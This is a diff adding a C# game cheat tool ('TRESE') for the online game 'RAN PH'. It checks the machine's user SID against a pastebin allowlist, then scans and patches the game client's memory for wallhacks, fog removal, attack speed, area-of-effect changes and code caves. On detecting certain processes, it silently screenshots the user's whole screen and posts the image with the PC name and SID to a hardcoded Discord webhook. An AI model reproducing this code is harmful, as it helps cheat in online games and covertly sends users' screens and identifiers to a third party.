@@ -1,0 +1,515 @@
+using ImGuiNET;
+using System.Numerics;
+using Memory;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using ClickableTransparentOverlay;
+using System.Net;
+using System.Security.Principal;
+using System.Text;
+using System.Drawing;
+using System.Drawing.Imaging;
+using Newtonsoft.Json;
+using System.DirectoryServices.AccountManagement;
+using SixLabors.ImageSharp.PixelFormats;
+
+namespace TRESE
+{
+    public class Program : Overlay
+    {
+        Mem m = new Mem();
+        [DllImport("kernel32.dll")]
+        public static extern bool FreeConsole();
+        [DllImport("user32.dll")]
+        static extern short GetAsyncKeyState(int vKey);
+        bool showWindow = true;
+
+        #region TRESE GUI
+        static async Task Main(string[] args)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            AnimateConsoleWriteLine(" ████████╗██████╗ ███████╗███████╗███████╗                ____ _    _ ______ _   _ _ ", 5);
+            AnimateConsoleWriteLine(" ╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝               /\\  | |  | |__   __| |  | |  ____| \\ | | |", 5);
+            AnimateConsoleWriteLine("    ██║   ██████╔╝█████╗  ███████╗█████╗                /  \\ | |  | |  | |  | |__| | |__  |  \\| | |", 5);
+            AnimateConsoleWriteLine("    ██║   ██╔══██╗██╔══╝  ╚════██║██╔══╝               / /\\ \\| |  | |  | |  |  __  |  __| | . ` | |", 5);
+            AnimateConsoleWriteLine("    ██║   ██║  ██║███████╗███████║███████╗            / ____ \\ |__| |  | |  | |  | | |____| |   |_|", 5);
+            AnimateConsoleWriteLine("    ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝           /_/    \\_\\____/   |_|  |_|  |_|______|_| \\_(_)", 5);
+            AnimateConsoleWriteLine("               Version 1.0.0.0                                     TRESE DEVELOPMENT", 1);
+            Console.ResetColor();
+            Console.WriteLine("                                                                                   ");
+
+            string hwid = WindowsIdentity.GetCurrent().User.Value;
+
+            WebClient wb = new WebClient();
+            string HWIDLIST = wb.DownloadString("https://pastebin.com/raw/DpgXuTuc");
+            if (HWIDLIST.Contains(hwid))
+            {
+                Program program = new Program();
+                await program.Start();
+                FreeConsole();
+            }
+            else
+            {
+                string message = "BETLOG KA DI KAPA NAKA ACTIVATE KINANGINAMO!";
+                AnimateConsoleWriteLine(message, 1); // Adjust delay as needed for this message 
+                Console.WriteLine(hwid);
+                Console.ReadLine();
+            }
+        }
+
+        public string TreseScan(string x)
+        {
+            IEnumerable<long> AoBScanResults1 = m.AoBScan(x, true, true, true).Result;
+            string y = AoBScanResults1.FirstOrDefault().ToString("x");
+
+            return y;
+        }
+
+        static void AnimateConsoleWriteLine(string message, int delay)
+        {
+            foreach (char c in message)
+            {
+                Console.Write(c);
+                Thread.Sleep(delay); // Use the provided delay for animation speed
+            }
+            Console.WriteLine();
+        }
+        #endregion
+
+        #region BUTTON | SLIDER FUNCTIONS
+
+        private float DRONE = 200f;
+        private float FASTSCROLL = 80f;
+        private float aoe = 0f;
+        private float aspd = 4800f;
+        private float ac = 0f;
+        private float lr = 0f;
+        private bool drone;
+        private bool fsc;
+        private bool wn;
+        private bool cb;
+        private bool pots;
+        private bool fix;
+        private bool Aslide;
+        private bool fog;
+        private bool hpf;
+        private bool tty;
+        private bool aoe1;
+        private bool asb;
+        private bool lrc;
+        private bool twf;
+
+        static int currentTab = 0;
+
+        UIntPtr TRESEAllocAddress;
+        string fogAddress = "";
+        string wnAddress = "";
+        string cbAddress = "";
+        string fscAddress = "";
+        string potsAddress = "";
+        string fixAddress = "";
+        string AslideAddress = "";
+        string zoomAddress = "";
+        string aoeAddress = "";
+        string asAddress = "";
+        string acAddress = "";
+        string lrAddress = "";
+        string hpfAddress = "";
+        string addqtty = "";
+        string aoe1Address = "";
+        string asbypass = "";
+        string lrcAddress = "";
+        string twfAddress = "";
+
+        #endregion
+
+        protected override void Render()
+        {
+            CheckForCheatEngine();
+
+            if (GetAsyncKeyState(0x2D) < 0)
+            {
+                showWindow = !showWindow;
+                Thread.Sleep(100);
+            }
+            else if (GetAsyncKeyState(0x2E) < 0)
+            {
+                Process.GetCurrentProcess().Kill();
+                Environment.Exit(0);
+            }
+
+            if (showWindow)
+            {
+                ImGuiStylePtr style = ImGui.GetStyle();
+                style.WindowBorderSize = 0.1f;
+
+                style.WindowRounding = 3;
+                style.ChildRounding = 3;
+                style.ScrollbarRounding = 10;
+                style.GrabRounding = 2;
+                style.FrameRounding = 2;
+                style.GrabMinSize = 10;
+
+                float buttonWidth = 120.0f;
+                float buttonHeight = 23.0f;
+                float buttonSpacing = -15.0f;
+                float buttonTotalWidth = 3 * buttonWidth + 2 * buttonSpacing;
+                float startY = ImGui.GetCursorPosY();
+                float centerY = startY + ImGui.GetTextLineHeightWithSpacing() * 0.50f; // <=== BUTTON UP AND DOWN
+
+                ImGui.Begin("RAN PH TURON | TRESE DEVELOPMENT", ImGuiWindowFlags.NoResize | ImGuiWindowFlags.NoScrollbar);
+                ImGui.SetWindowSize(new Vector2(393, 288)); // <=== SIZE OF UI
+                bool proc = m.OpenProcess("gameclient.exe"); // <=== MODULE HANDLE
+
+                ImGui.Text("TRESE DEVELOPMENT.COM");
+
+                if (proc)
+                {
+                    ImGui.Text("Connection Status:");
+                    ImGui.SameLine();
+                    ImGui.Text("Connected");
+                }
+                else
+                {
+                    ImGui.Text("Connection Status:");
+                    ImGui.SameLine();
+                    ImGui.Text("Waiting process...");
+                }
+
+                #region IMGUI BUTTONS
+                if (ImGui.Button("MAIN", new Vector2(buttonWidth, buttonHeight)))
+                {
+                    currentTab = 1;
+                }
+                ImGui.SameLine();
+                if (ImGui.Button("ADJUSTABLE", new Vector2(buttonWidth, buttonHeight)))
+                {
+                    currentTab = 2;
+                }
+                ImGui.SameLine();
+                if (ImGui.Button("PASSIVE", new Vector2(buttonWidth, buttonHeight)))
+                {
+                    currentTab = 3;
+                }
+                #endregion 
+
+                if (currentTab == 0)
+                {
+                    ImGui.BeginChild("##a", new Vector2(376, 210), true);
+                    ImGui.Spacing();
+
+                    for (int i = 0; i < 38; i++)
+                    {
+                        ImGui.Spacing();
+                    }
+
+                    //ImGui.Text("      CLICK THE BUTTON BELOW MOTHERFUCKER!!"); // <=== TEXT FOR EXAMPLE: X1 BUFF BEFORE CLICKING ASPD BYPASS
+
+                    //if (ImGui.Button("      PINDUTIN MO!!!!      "))
+                    {
+                        zoomAddress = TreseScan("00 00 48 43 7C D9 A0");
+                        wnAddress = TreseScan("74 23 8B 4C 24 34 51 8D");
+                        cbAddress = TreseScan("74 57 55 68 00 A5 FF FF 55");
+                        //fixAddress = TreseScan("06 00 00 00 E8 FD D8 F2 FF 8B 44 24 2C 8B");
+                        AslideAddress = TreseScan("05 8B CF FF 50 10 85 C0");
+                        potsAddress = TreseScan("02 52 83 CE");
+                        fogAddress = TreseScan("00 00 2F 44 00 00 1B 44");
+                        //fscAddress = TreseScan("00 00 A0 42 35 FA 0E 3C");
+                        aoeAddress = TreseScan("C3 33 C0 C3");
+                        asAddress = TreseScan("D9 81 D0 77 00 00");
+                        //acAddress = TreseScan("D8 86 EC 87 00 00 8B");
+                        //lrAddress = TreseScan("D9 5C 24 34 FF 50 10");
+                        //addqtty = TreseScan("66 39 4B 10 76");
+                        asbypass = TreseScan("D9 9D 48 7D 00 00 8B");
+                        //lrcAddress = TreseScan("70 41 00 00 00 00 00 00 00 00 00 00 00 00");
+                        twfAddress = TreseScan("05 00 00 00 D2 00");
+
+                        //// AOE ADDRESS
+                        byte[] tresebytesX1 = { 0xD8, 0x25, 0x33, 0x33, 0xFF, 0x03, 0xD8, 0x5C, 0x24, 0x0C, 0xDF, 0xE0 };
+                        UIntPtr tresecodecaveBase1 = m.CreateCodeCave(aoeAddress, tresebytesX1, 6, 1000);
+                        TRESEAllocAddress = UIntPtr.Add(tresecodecaveBase1, tresebytesX1.Length);
+                        // ASPD ADDRESS
+                        //byte[] tresebytesX2 = { 0xD9, 0x81, 0xD0, 0x77, 0x00, 0x00, 0xD8, 0x05, 0x33, 0x54, 0x43, 0x05 };
+                        //UIntPtr tresecodecaveBase2 = m.CreateCodeCave(asAddress, tresebytesX2, 6, 1000);
+                        //TRESEAllocAddress = UIntPtr.Add(tresecodecaveBase2, tresebytesX2.Length);
+                        //// AUTO CUT SKILL ADDRESS
+                        //byte[] tresebytesX3 = { 0xD8, 0x05, 0x22, 0x22, 0xFF, 0x02, 0xD8, 0x86, 0xEC, 0x87, 0x00, 0x00 };
+                        //UIntPtr tresecodecaveBase3 = m.CreateCodeCave(acAddress, tresebytesX3, 6, 1000);
+                        //TRESEAllocAddress = UIntPtr.Add(tresecodecaveBase3, tresebytesX3.Length);
+                        //// LR ADDRESS
+                        //byte[] tresebytesX4 = { 0xD8, 0x25, 0x44, 0x44, 0xFF, 0x04, 0xD9, 0x5C, 0x24, 0x34, 0xFF, 0x50, 0x10 };
+                        //UIntPtr tresecodecaveBase4 = m.CreateCodeCave(lrAddress, tresebytesX4, 7, 1000);
+                        //TRESEAllocAddress = UIntPtr.Add(tresecodecaveBase4, tresebytesX4.Length);
+
+                        currentTab = 1;
+                    }
+
+                }
+
+                if (currentTab == 1) // <=== BUTTONS
+                {
+                    ImGui.BeginChild("##b", new Vector2(376, 210), true);
+
+                    //ImGui.Checkbox("DRONE VIEW", ref drone);
+                    //if (drone == true)
+                        //m.WriteMemory(zoomAddress, "float", "99999");
+                    //else
+                        //m.WriteMemory(zoomAddress, "float", "200");
+
+                    //ImGui.Checkbox("FAST SCROLL", ref fsc);
+                    //if (fsc == true)
+                    //m.WriteMemory(fscAddress, "float", "00 00 C8 43 35 FA 0E 3C");
+                    //else
+                    //m.WriteMemory(fscAddress, "float", "00 00 A0 42 35 FA 0E 3C");
+
+                    ImGui.Checkbox("WALL NAME", ref wn);
+                    if (wn == true)
+                        m.WriteMemory(wnAddress, "byte", "EB");
+                    else
+                        m.WriteMemory(wnAddress, "byte", "74");
+
+                    ImGui.Checkbox("ANTI CB", ref cb);
+                    if (cb == true)
+                        m.WriteMemory(cbAddress, "byte", "EB");
+                    else
+                        m.WriteMemory(cbAddress, "byte", "74");
+
+                    ImGui.Checkbox("Anti Slide", ref Aslide);
+                    if (Aslide == true)
+                        m.WriteMemory(AslideAddress, "byte", "0");
+                    else
+                        m.WriteMemory(AslideAddress, "byte", "5");
+
+                    //ImGui.Checkbox("FIX TARGET", ref fix);
+                    //if (fix == true)
+                    //    m.WriteMemory(fixAddress, "byte", "0");
+                    //else
+                    //    m.WriteMemory(fixAddress, "byte", "6");
+
+                    ImGui.Checkbox("AUTO POTS", ref pots);
+                    if (pots == true)
+                        m.WriteMemory(potsAddress, "byte", "1");
+                    else
+                        m.WriteMemory(potsAddress, "byte", "2");
+
+                    ImGui.Checkbox("REMOVE FOG", ref fog);
+                    if (fog == true)
+                        m.WriteMemory(fogAddress, "float", "9000");
+                    else
+                        m.WriteMemory(fogAddress, "float", "700");
+
+                    //ImGui.Checkbox("LONG RANGE", ref lrc);
+                    //if (lrc == true)
+                    //m.WriteMemory(lrcAddress, "float", "999");
+                    //else
+                    //m.WriteMemory(lrcAddress, "float", "15");
+
+                    //ImGui.Checkbox("HP FREEZE", ref hpf);
+                    //string hpf1 = "00C4EEB0";
+                    //if (hpf == true)
+                    //    m.FreezeValue(hpf1, "bytes", "c1 40 90 90");
+                    //else
+                    //    m.UnfreezeValue(hpf1);
+
+
+                    //ImGui.Checkbox("QUANTITY", ref tty);
+                    //if (tty == true)
+                    //m.WriteMemory(addqtty, "bytes", "66 39 4B EF");
+                    //else
+                    //m.WriteMemory(addqtty, "bytes", "66 39 4B 10");
+
+
+                    ImGui.Checkbox("AOE", ref tty);
+                    if (tty == true)
+                        m.WriteMemory(aoe1Address, "byte", "D1");
+                    else
+                        m.WriteMemory(aoe1Address, "byte", "C0");
+
+                    //ImGui.Checkbox("AS BYPASS", ref asb);
+                    //if (asb == true)
+                    //    m.WriteMemory(asbypass, "byte", "D8");
+                    //else
+                    //    m.WriteMemory(asbypass, "byte", "d8");
+
+                    ImGui.Checkbox("FAST REVIVE", ref twf);
+                    if (twf == true)
+                        m.WriteMemory(twfAddress, "byte", "2");
+                    else
+                        m.WriteMemory(twfAddress, "byte", "5");
+
+
+
+
+                    ImGui.EndChild();
+                }
+
+                if (currentTab == 2) // <=== SLIDERS
+                {
+                    ImGui.BeginChild("##c", new Vector2(376, 210), true);
+
+                    ImGui.SliderFloat("DRONE VIEW", ref DRONE, 200f, 999f);
+                    m.FreezeValue("00 00 48 43 7C D9 A0", "float", DRONE.ToString());
+
+                    ImGui.SliderFloat("FAST SCROLL", ref FASTSCROLL, 80f, 500f);
+                    m.WriteMemory("030DB5644", "float", FASTSCROLL.ToString());
+
+
+                    //ImGui.SliderInt("AOE", ref aoe, 192, 209);
+                    //m.WriteMemory("005FE682", "byte", aoe.ToString());
+
+                    //int aoeInt = aoe;
+                    //ImGui.SliderInt("AREA OF EFFECT", ref aoeInt, 192, 209);
+                    //aoe = aoeInt;
+                    //byte[] aoeBytes = BitConverter.GetBytes(aoeInt); // Convert int to byte array
+                    //m.WriteMemory("005FE682", "bytes", BitConverter.ToString(aoeBytes).Replace("C0", "D1")); // Convert byte array to string
+
+
+                    ImGui.SliderFloat("AREA OF EFFECT", ref aoe, 0f, 50f);
+                    m.WriteMemory("00fd0090", "float", aoe.ToString());
+
+                    ImGui.SliderFloat("ATTACKSPEED", ref aspd, 4800f, 9000f);
+                    m.WriteMemory("GameClient.exe+5496F0", "float", aspd.ToString());
+
+                    ImGui.SliderFloat("AUTO CUT SKILL", ref ac, 0f, 0.05f);
+                    m.WriteMemory("02FF2222", "float", ac.ToString());
+
+                    ImGui.SliderFloat("LONG RANGE", ref lr, 0f, 100f);
+                    m.WriteMemory("04FF4444", "float", lr.ToString());
+
+
+
+                    ImGui.EndChild();
+                }
+
+                if (currentTab == 3) // <=== PASSIVE
+                {
+                    ImGui.BeginChild("##d", new Vector2(376, 210), true);
+
+                    ImGui.SeparatorText("Keyboard Shortcuts");
+                    ImGui.Text(" [INS] => Hide & Show Application");
+                    ImGui.Text(" [DEL] => Exit Application");
+
+
+
+
+                    ImGui.EndChild();
+                }
+            }
+        }
+        private static string CaptureScreenshot()
+        {
+            string filePath = Path.Combine(Path.GetTempPath(), "screenshot.png");
+            var screenBounds = new Rectangle(0, 0, 1920, 1080);
+
+            using (Bitmap bmp = new Bitmap(screenBounds.Width, screenBounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bmp))
+                {
+                    g.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
+                }
+                bmp.Save(filePath, ImageFormat.Png);
+            }
+
+            return filePath;
+        }
+        private static async Task SendDiscordMessage(string message, string screenshotPath)
+        {
+            // Get the PC name
+            string pcName = Environment.MachineName;
+
+            // Get the SID
+            string sid = GetCurrentUserSid();
+
+            // Prepare the message with PC name and SID
+            string detailedMessage = $"{message}\nPC NAME: {pcName}\nUSER SID: {sid}";
+
+            using (var client = new HttpClient())
+            {
+                var discordWebhookUrl = "https://discord.com/api/webhooks/1348849414344544418/c63HOwy6ORWOrDn9MjclH3YnjikZmkAvCwLg5u8CDLSjSRAKoWCmDVkZy68TTDuprZEA";
+
+                // Prepare the file and message content
+                var content = new MultipartFormDataContent();
+                var imageContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
+                imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                content.Add(imageContent, "file", "screenshot.png");
+
+                var embed = new
+                {
+                    embeds = new[]
+                    {
+                new
+                {
+                    title = "wow huh! Someone's trying to kuha kuha my code huh!",
+                    description = detailedMessage,
+                    color = 16711680, // Red color code
+                    image = new { url = "attachment://screenshot.png" } // Use the filename you uploaded
+                }
+            }
+                };
+
+                content.Add(new StringContent(JsonConvert.SerializeObject(embed), Encoding.UTF8, "application/json"), "payload_json");
+
+                // Send the message with the embedded screenshot
+                var response = await client.PostAsync(discordWebhookUrl, content);
+                response.EnsureSuccessStatusCode();
+            }
+        }
+        private static string GetCurrentUserSid()
+        {
+            try
+            {
+                // Use ContextType.Machine for local machine scenarios
+                using (var context = new PrincipalContext(ContextType.Machine))
+                {
+                    // Get the current user
+                    var user = UserPrincipal.Current;
+
+                    // Check if the user is not null and return the SID
+                    if (user != null)
+                    {
+                        return user.Sid.ToString();
+                    }
+                    else
+                    {
+                        return "Current user not found";
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // Handle or log exception
+                return $"Error retrieving SID: {ex.Message}";
+            }
+        }
+        private static void CheckForCheatEngine()
+        {
+            foreach (Process proc in Process.GetProcesses())
+            {
+                try
+                {
+                    if (proc.ProcessName.ToLower().Contains("asd") || proc.MainWindowTitle.ToLower().Contains("bossb engine"))
+                    {
+                        // Define your custom message without the process name
+                        string customMessage = "DETECTED YUNG GAGO OH !!";
+                        Console.WriteLine(customMessage);
+
+                        string screenshotPath = CaptureScreenshot();
+                        SendDiscordMessage(customMessage, screenshotPath).Wait();
+
+                        if (File.Exists(screenshotPath))
+                        {
+                            File.Delete(screenshotPath);
+                        }
+
+                        proc.Kill();
+                        Environment.Exit(0);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.Write("Error checking process: " + ex.Message);
+                }
+            }
+        }
+    }
+}
